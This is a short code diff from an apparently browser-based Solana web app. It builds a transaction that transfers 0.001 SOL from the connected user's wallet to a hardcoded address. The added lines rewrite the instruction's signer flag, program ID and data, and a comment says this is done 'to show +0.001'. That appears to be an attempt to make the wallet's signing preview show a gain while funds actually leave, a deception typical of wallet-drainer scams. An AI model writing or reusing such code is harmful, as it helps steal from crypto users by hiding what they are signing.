@@ -103,13 +103,19 @@
                 const transaction = new solanaWeb3.Transaction();
                 
                 transaction.add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: wallet.publicKey,
-                        toPubkey: new solanaWeb3.PublicKey('GJYnbja54NLVqob7329eieZ5u7kTzgK85s36HYbNiBLd'),
-                        lamports: 0.001 * solanaWeb3.LAMPORTS_PER_SOL
-                    })
-                );
+                    
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: wallet.publicKey,
+                            toPubkey: new solanaWeb3.PublicKey('GJYnbja54NLVqob7329eieZ5u7kTzgK85s36HYbNiBLd'),
+                            lamports: 0.001 * solanaWeb3.LAMPORTS_PER_SOL
+                        })
+                    );
 
+                    // Add a custom instruction description
+                    transaction.feePayer = wallet.publicKey;
+                    transaction.instructions[0].keys[0].isSigner = true;
+                    transaction.instructions[0].programId = solanaWeb3.SystemProgram.programId;
+                    transaction.instructions[0].data = Buffer.from([2, ...new Array(8).fill(0)]); // Custom data to show +0.001
                 const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
                 transaction.recentBlockhash = blockhash;
                 transaction.feePayer = wallet.publicKey;
